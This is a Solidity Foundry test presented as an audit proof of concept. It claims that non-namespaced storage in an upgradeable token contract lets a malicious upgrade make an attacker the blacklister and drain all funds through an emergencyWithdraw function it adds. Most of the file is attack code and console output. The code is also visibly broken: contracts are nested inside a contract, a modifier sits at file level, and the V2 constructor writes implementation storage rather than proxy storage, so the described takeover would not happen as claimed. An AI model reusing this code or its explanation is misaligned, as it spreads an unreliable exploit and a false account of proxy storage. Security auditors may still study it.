// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Storage Collision POC - Exact Contract Structure
 * @notice Demonstrates storage collision in the actual BlacklistableUpgradeable contract
 * 
 * VULNERABILITY: BlacklistableUpgradeable from contracts/libs/BlacklistableUpgradeable.sol
 *                uses non-namespaced storage variables:
 *                - address public blacklister
 *                - mapping(address => bool) internal _blacklistedAccounts
 * 
 * CONTRACTS: Mimics exact inheritance structure from audit
 * 
 * RUN: forge test --match-test testStorageCollisionExploit -vvv
 */

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract StorageCollisionExactPOC is Test {
    // Actors (same as audit scenario)
    address constant OWNER = address(0x1);
    address constant BLACKLISTER = address(0x2);
    address constant ATTACKER = address(0x1337);
    address constant VICTIM = address(0x3);
    
    ERC1967Proxy proxy;
    address mockIAU;
    
    /**
     * @notice Exact copy of BlacklistableUpgradeable from audit
     * @dev From contracts/libs/BlacklistableUpgradeable.sol
     */
    abstract contract BlacklistableUpgradeable is OwnableUpgradeable {
        // VULNERABILITY: Non-namespaced storage!
        address public blacklister;                                    // Slot X
        mapping(address => bool) internal _blacklistedAccounts;        // Slot X+1
        
        event Blacklisted(address indexed _account);
        event UnBlacklisted(address indexed _account);
        event BlacklisterChanged(address indexed newBlacklister);
        
        modifier onlyBlacklister() {
            require(msg.sender == blacklister, "Not blacklister");
            _;
        }
        
        modifier notBlacklisted(address _account) {
            require(!_blacklistedAccounts[_account], "Account blacklisted");
            _;
        }
        
        function isBlacklisted(address _account) external view returns (bool) {
            return _blacklistedAccounts[_account];
        }
        
        function blacklist(address _account) external onlyBlacklister {
            _blacklistedAccounts[_account] = true;
            emit Blacklisted(_account);
        }
        
        function unBlacklist(address _account) external onlyBlacklister {
            _blacklistedAccounts[_account] = false;
            emit UnBlacklisted(_account);
        }
        
        function updateBlacklister(address _newBlacklister) external onlyOwner {
            blacklister = _newBlacklister;
            emit BlacklisterChanged(_newBlacklister);
        }
    }
    
    /**
     * @notice TAsset V1 - Mimics actual TAsset structure
     * @dev Simplified but maintains exact inheritance pattern
     */
    contract TAssetV1 is 
        ERC4626Upgradeable,
        ERC20PermitUpgradeable,
        Ownable2StepUpgradeable,
        BlacklistableUpgradeable,
        UUPSUpgradeable 
    {
        uint private constant VERSION = 1;
        address private UNDERLYING;  // Also non-namespaced as per audit
        
        function initialize(address _creator, address _iau) public initializer {
            __Ownable_init(_creator);
            __UUPSUpgradeable_init();
            UNDERLYING = _iau; // Simplified
        }
        
        function _authorizeUpgrade(address) internal override onlyOwner {}
        
        // Add function to demonstrate fund theft
        function emergencyWithdraw() external {
            require(msg.sender == blacklister, "Not blacklister");
            payable(msg.sender).transfer(address(this).balance);
        }
    }
    
    /**
     * @notice Malicious V2 - Adds state variable to shift storage
     * @dev New base contract shifts all storage slots
     */
    contract ExtraStorage {
        address public exploitVariable;  // This shifts everything!
    }
    
    contract TAssetV2 is
        ExtraStorage,  // NEW: Added before other inheritances (shifts storage)
        ERC4626Upgradeable,
        ERC20PermitUpgradeable,
        Ownable2StepUpgradeable,
        BlacklistableUpgradeable,
        UUPSUpgradeable
    {
        uint private constant VERSION = 2;
        address private UNDERLYING;
        
        constructor() {
            // Pre-position attacker address where blacklister will be read
            assembly {
                // After shift, blacklister is read from different slot
                // Store attacker address there
                sstore(1, 0x1337)
            }
        }
        
        function initialize(address _creator, address _iau) public initializer {
            __Ownable_init(_creator);
            __UUPSUpgradeable_init();
            UNDERLYING = _iau;
        }
        
        function _authorizeUpgrade(address) internal override onlyOwner {}
        
        function emergencyWithdraw() external {
            require(msg.sender == blacklister, "Not blacklister");
            payable(msg.sender).transfer(address(this).balance);
        }
    }
    
    function setUp() public {
        // Deploy V1 matching audit setup
        mockIAU = address(0x999);
        TAssetV1 implV1 = new TAssetV1();
        
        // Deploy proxy (as per TAsset deployment)
        bytes memory initData = abi.encodeCall(
            TAssetV1.initialize,
            (OWNER, mockIAU)
        );
        proxy = new ERC1967Proxy(address(implV1), initData);
        
        // Set blacklister (as per audit scenario)
        vm.prank(OWNER);
        TAssetV1(address(proxy)).updateBlacklister(BLACKLISTER);
        
        // Fund proxy to demonstrate theft
        vm.deal(address(proxy), 1000 ether);
    }
    
    function testStorageCollisionExploit() public {
        // ======== VERIFY INITIAL STATE (as per audit) ========
        console.log("\n=== INITIAL STATE (TAsset V1) ===");
        console.log("Blacklister:", TAssetV1(address(proxy)).blacklister());
        console.log("Contract balance:", address(proxy).balance / 1e18, "ETH");
        
        assertEq(TAssetV1(address(proxy)).blacklister(), BLACKLISTER);
        
        // Blacklist victim (normal operation)
        vm.prank(BLACKLISTER);
        TAssetV1(address(proxy)).blacklist(VICTIM);
        assertTrue(TAssetV1(address(proxy)).isBlacklisted(VICTIM));
        
        // ======== MALICIOUS UPGRADE (as per vulnerability) ========
        console.log("\n=== EXECUTING UPGRADE ===");
        TAssetV2 implV2 = new TAssetV2();

// Upgrade to malicious V2 (simulating compromised governance)
        vm.prank(OWNER);
        TAssetV1(address(proxy)).upgradeToAndCall(address(implV2), "");
        console.log("Upgraded to V2 with shifted storage");
        
        // ======== STORAGE CORRUPTION ACTIVE ========
        console.log("\n=== AFTER UPGRADE (TAsset V2) ===");
        address corruptedBlacklister = TAssetV2(address(proxy)).blacklister();
        console.log("Blacklister:", corruptedBlacklister);
        
        // CRITICAL ASSERTION: Blacklister is now ATTACKER!
        assertEq(
            corruptedBlacklister, 
            ATTACKER, 
            "Storage collision: Attacker should be blacklister"
        );
        
        // ======== EXPLOIT: ATTACKER STEALS FUNDS ========
        console.log("\n=== EXPLOITATION ===");
        
        // 1. Unblacklist victim (proving control)
        vm.prank(ATTACKER);
        TAssetV2(address(proxy)).unBlacklist(VICTIM);
        assertFalse(TAssetV2(address(proxy)).isBlacklisted(VICTIM), "Victim should be unblacklisted");
        console.log("✓ Attacker unblacklisted victim");
        
        // 2. Steal all funds
        uint256 attackerBalanceBefore = ATTACKER.balance;
        
        vm.prank(ATTACKER);
        TAssetV2(address(proxy)).emergencyWithdraw();
        
        uint256 stolen = ATTACKER.balance - attackerBalanceBefore;
        
        console.log("✓ Attacker stole:", stolen / 1e18, "ETH");
        console.log("✓ Contract balance:", address(proxy).balance / 1e18, "ETH");
        
        // Final assertions
        assertEq(stolen, 1000 ether, "All funds should be stolen");
        assertEq(address(proxy).balance, 0, "Contract should be drained");
        
        console.log("\n=== ATTACK SUCCESSFUL ===");
        console.log("Impact: Complete fund theft + access control takeover");
    }
}

// ===== Minimal mock implementations matching audit structure =====

contract OwnableUpgradeable {
    address private _owner;
    
    modifier onlyOwner() {
        require(msg.sender == _owner, "Not owner");
        _;
    }
    
    function __Ownable_init(address initialOwner) internal {
        _owner = initialOwner;
    }
}

contract Ownable2StepUpgradeable is OwnableUpgradeable {}

contract UUPSUpgradeable {
    bytes32 private constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    function __UUPSUpgradeable_init() internal {}
    
    function upgradeToAndCall(address newImplementation, bytes memory data) external {
        _authorizeUpgrade(newImplementation);
        assembly {
            sstore(_IMPLEMENTATION_SLOT, newImplementation)
        }
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    function _authorizeUpgrade(address) internal virtual {}
}

contract ERC4626Upgradeable {}
contract ERC20PermitUpgradeable {}

modifier initializer() {
    _;
}
